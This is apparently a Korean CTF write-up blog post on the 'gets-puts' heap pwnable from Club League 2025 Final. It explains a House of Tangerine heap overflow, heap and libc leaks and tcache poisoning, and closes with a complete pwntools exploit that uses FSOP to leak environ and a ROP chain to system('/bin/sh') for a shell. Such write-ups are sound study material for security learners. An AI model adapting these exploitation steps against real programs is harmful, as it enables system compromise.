---
title: "[Writeups][Club League 2025: Final] gets-puts"
excerpt: "Club League 2025 Final - gets-puts (pwnable)"

categories:
  - Writeups
tags:
  - [hspace, club league, getsputs]

permalink: /writeups/club-league-2025-final-gets-puts/

toc: true
toc_sticky: true

date: 2025-11-25
last_modified_at: 2025-11-25
---

Club League 2025 Final에 나가서 포너블 하나를 풀었다. 마지막에 libc를 잘못 뽑고 로되리안 걸려서 쌩쑈하다가 다 때려부술뻔 했는데,
다행히도 리모트에서 마무리는 딴 분이 해주셨다.

# 1. 바이너리 분석
IDA로 따볼 필요도 없이 코드가 주어졌다.

```c
// gcc -o gets-puts main.c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    char *ptr = 0;
    char buf[32];

    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    while (1) {
        puts("1. malloc");
        puts("2. gets");
        puts("3. puts");
        printf("> ");
        scanf("%16s%*c", buf);
        switch (atoi(buf)) {
        case 1:
            printf("size: ");
            scanf("%16s%*c", buf);
            ptr = malloc(atoi(buf));
            break;
        case 2:
            gets(ptr);
            break;
        case 3:
            puts(ptr);
            break;
        }
    }
}
```
힙오버가 바로 보인다. 다만 관리할 수 있는 청크가 하나밖에 없고,
딱히 `free()`가 없기 때문에 House of Tangerine을 생각해 볼 수 있다. `checksec`을 통해 바이너리를 살펴보면
![checksec](/assets/images/posts_img/writeups/club-league-final-getsputs/checksec.png)
위와 같이 canary도 걸려있지 않기 때문에 마무리는 `environ` + ROP나 FSOP를 사용해볼 수 있겠다 생각할 수 있다.

# 2. House of Tangerine

우선 House of Tangerine을 잘 못 쓰기 때문에, 예전에 대충 계산해뒀던 숫자들을 사용했다. 공격 방식은 다음과 같다.

1. `0x10` 크기의 청크를 할당함
2. `0xd00 - 0x10` 크기의 청크를 할당함
3. 탑 청크의 크기를 `0x51`로 overwrite함
4. `0x60` 크기의 청크를 할당함

이렇게 하면 기존 Top Chunk가 `sysmalloc()` 경로를 타며 `0x20` 청크가 되어 tcache에 들어가데 된다. 자세한 원리는 기억도 안 나고 공부할 때 이해도 제대로 못 해서
잘 모르겠다. 나중에 기회가 되면 좀 더 자세히 분석해서 써보려 한다.

# 3. AAR / AAW
## 3-1. Heap Leak

힙 릭은 굉장히 간단하다. 앞서 tcache에 넣은 청크를 그대로 할당받은 후, `key` 필드가 zeroing 되었다는 점을 고려해 8바이트만큼 아무 문자로나 채워준 후 읽으면 된다.

```python
malloc(0x10)
malloc(0xd00 - 0x10)

payload  = b'A' * (0xd00 - 0x8)
payload += p64(0x51)
gets(payload)

malloc(0x60)
malloc(0x20)
puts()

heap = u64(b"\x00\x00\x00" + p.recvn(5)) >> 12
key = heap >> 12
success(f"heap: {hex(heap)} key: {hex(key)}")
```

## 3-1. Libc Leak

우선 위에서 제시한 방법으로는 tcache에밖에 청크를 못 넣기 때문에, 다른 방법을 생각해야 한다. 그런데 House of Tangerine을 연속으로 사용해
`0x20` 크기의 free된 청크를 계속 할당하다 보면 꽤나 재미있는 사실을 하나 발견할 수 있다.

<center>
    <a href="/assets/images/posts_img/writeups/club-league-final-getsputs/fastbin-1.png">
        <img src="/assets/images/posts_img/writeups/club-league-final-getsputs/fastbin-1.png" alt="fastbin-2.png">
    </a>
</center>

<center>
    <a href="/assets/images/posts_img/writeups/club-league-final-getsputs/fastbin-2.png">
        <img src="/assets/images/posts_img/writeups/club-league-final-getsputs/fastbin-2.png" alt="fastbin-2.png">
    </a>
</center>

위의 사진에서 볼 수 있듯 원래 tcache가 꽉 찬 상태에서 `0x20` 크기의 청크가 free되면 모두 fastbin으로 들어가야 하는데, `sysmalloc()`이 호출되며 모종의 이유로
청크들이 자신의 사이즈에 맞는 곳으로 재배치되는 것을 볼 수 있다. 즉 smallbin에 들어간 청크를 꺼내온 후 값을 읽으면 unsorted bin에 들어갔다 나온 청크처럼
fd값을 읽어 `main_arena+N` 값을 읽을 수 있게 되고, 이를 사용하면 libc leak이 가능해진다.

```python
# 1. fill tcache
for i in range(7):
    malloc(0xf40 - 0x10)
    payload  = b"A" * (0xf40 - 0x8)
    payload += p64(0x51)
    gets(payload)
    malloc(0x60)

# 2. fastbin + smallbin
for i in range(2):
    malloc(0xf40 - 0x10)
    payload  = b"A" * (0xf40 - 0x8)
    payload += p64(0x51)
    gets(payload)
    malloc(0x60)

# 3. empty tcache
for i in range(7):
    malloc(0x20)

malloc(0x20)  # fastbin
malloc(0x20)  # smallbin
puts()
libc.address = u64(p.recvn(6) + b"\x00\x00") - 0x1d2ce0
success(f"libc: {hex(libc.address)}")
```

## 3-2. Tcache Poisoning

가장 지옥같은 부분이었다. 청크를 하나밖에 관리할 수 없고 오버플로우는 낮은 방향에서 높은 방향으로 일어나기 때문에,
뭔가 fastbin reverse into tcache와 비슷한 방법을 써야 했다. 그런데 House of Tangerine을 사용해 청크를 해제시키면 재배치가 일어나 fastbin에 들어있던
청크들이 자신의 크기와 맞는 bin으로 이동하니, 이걸 쓸 수는 없었다. 그래서 이런 공격방식을 온몸을 비틀어서 생각해냈다.

1. tcache를 채운다. 1번청크부터 7번청크가 들어갔다 치자.
2. 4개의 청크를 더 `free()`한다. A, B, C, D가 free되었다고 치면 bin의 모습이 다음과 같을 것이다.  
   &nbsp;&nbsp;`fastbin`: D  
   &nbsp;&nbsp;`smallbin`: A → B → C (참고로 smallbin은 FIFO다!)
3. tcache를 비운 후, 청크를 하나 꺼내면 `fastbin`의 D가 나갈 것이다.
4. 청크를 하나 더 꺼내면, `smallbin`의 청크 A가 나감과 동시에 남은 청크들이 `tcache`로 들어간다.
5. 그러나 A는 B, C보다 높은 주소에 존재하기 때문에, 간단한 heap overflow를 통해 tcache poisoning이 가능해진다.

이 정도로 온몸을 비트는 문제는 아니었는데, 어쨌든 이렇게 AAW/AAR 프리미티브를 얻을 수 있었다.

# 4. Exploit

이제 할 건 다 했다. 마무리는 FSOP로 `environ` 유출 후 `gets()`의 return address 오프셋 계산, `system("/bin/sh")`로 ROP를 작성해서 마무리했다.
전체 익스플로잇 코드는 다음과 같다.

<details>
<summary>펼치기/접기</summary>
{% highlight python %}
from pwn import *

p = process("./gets-puts")
# context.binary = "./gets-puts"
libc = ELF("libc.so.6")

# context.log_level = "debug"

def malloc(sz):
p.sendlineafter(b"> ", b'1')
p.sendlineafter(b": ", str(sz).encode())

def gets(data):
p.sendlineafter(b"> ", b'2')
p.sendline(data)

def puts():
p.sendlineafter(b"> ", b'3')


# 1st tcache
malloc(0x10)
malloc(0xd00 - 0x10)

payload  = b'A' * (0xd00 - 0x8)
payload += p64(0x51)
gets(payload)

malloc(0x60)
malloc(0x20)
puts()

heap = u64(b"\x00\x00\x00" + p.recvn(5)) >> 12
key = heap >> 12
success(f"heap: {hex(heap)} key: {hex(key)}")

# 1. fill tcache
for i in range(7):
malloc(0xf40 - 0x10)
payload  = b"A" * (0xf40 - 0x8)
payload += p64(0x51)
gets(payload)
malloc(0x60)

# 2. fastbin + smallbin
for i in range(2):
malloc(0xf40 - 0x10)
payload  = b"A" * (0xf40 - 0x8)
payload += p64(0x51)
gets(payload)
malloc(0x60)

# 3. empty tcache
for i in range(7):
malloc(0x20)

malloc(0x20)  # fastbin
malloc(0x20)  # smallbin
puts()
libc.address = u64(p.recvn(6) + b"\x00\x00") - 0x1d2ce0
success(f"libc: {hex(libc.address)}")

###############################################

# 1. fill tcache
for i in range(7):
malloc(0xf40 - 0x10)
payload  = b"A" * (0xf40 - 0x8)
payload += p64(0x51)
gets(payload)
malloc(0x60)

gdb.attach(p, "set solib-search-path /home/flyahn06/SecurityFACT/club_league_2025_final/gets-puts/for_user"); pause(1)
# 2. fastbin + smallbin
for i in range(4):
malloc(0xf40 - 0x10)
payload  = b"A" * (0xf40 - 0x8)
payload += p64(0x51)
gets(payload)
malloc(0x60)

# 3. empty tcache
for i in range(7):
malloc(0x20)

malloc(0x20)
malloc(0x20)

payload  = b"A" * (0x44000 - 0x8)
payload += p64(0x31) + p64((libc.symbols["_IO_2_1_stdout_"]) ^ (key + 0x285))
gets(payload)

malloc(0x20)
malloc(0x20)

payload  = p64(0xfbad2887)
payload += p64(libc.symbols["_IO_2_1_stdout_"] + 0x83)
payload += p64(libc.symbols["environ"])  # _IO_read_end
payload += p64(libc.symbols["_IO_2_1_stdout_"] + 0x83)  # _IO_read_base
payload += p64(libc.symbols["environ"])        # _IO_write_base
payload += p64(libc.symbols["environ"] + 0x8)  # _IO_write_ptr
payload += p64(libc.symbols["environ"] + 0x8)  # _IO_write_end
payload += p64(libc.symbols["_IO_2_1_stdout_"] + 0x83)  # buf base...
payload += p64(libc.symbols["_IO_2_1_stdout_"] + 0x84)  # buf base...
gets(payload)

env = u64(p.recvn(6) + b"\x00\x00")

#############################################

# 1. fill tcache
for i in range(7):
malloc(0xf40 - 0x10)
payload  = b"A" * (0xf40 - 0x8)
payload += p64(0x51)
gets(payload)
malloc(0x60)

# 2. fastbin + smallbin
for i in range(4):
malloc(0xf40 - 0x10)
payload  = b"A" * (0xf40 - 0x8)
payload += p64(0x51)
gets(payload)
malloc(0x60)

# 3. empty tcache
for i in range(7):
malloc(0x20)

malloc(0x20)
malloc(0x20)

payload  = b"A" * (0x44000 - 0x8)

print(env - 0x198, key + 0x3fb)
payload += p64(0x31) + p64((env - 0x198) ^ (key + 0x3fb))
gets(payload)

malloc(0x20)
malloc(0x20)

success(f"target: {hex(env - 0x198)}")
payload  = b'A' * 0x8
payload += b'B' * 0x8
payload += b'C' * 0x8
payload += b'C' * 0x8
payload += b'C' * 0x8
payload += p64(libc.address + 0x0000000000027725)
payload += p64(libc.address + 0x196031)
payload += p64(libc.address + 0x00000000000270c2)
payload += p64(libc.symbols["system"])

gets(payload)

p.interactive()
{% endhighlight %}
</details>

# 5. 여담

인텐은 당연히 이따구로 푸는 건 아니고, unsorted bin을 통한 leak + FSOP로 쉘을 얻는 거였다. 난 `exit()`이 호출될 때 `_IO_close_all()`을 통한 FSOP 방법만
알고 있어서 쓰진 못했는데, 좀 연구해봐야겠다.
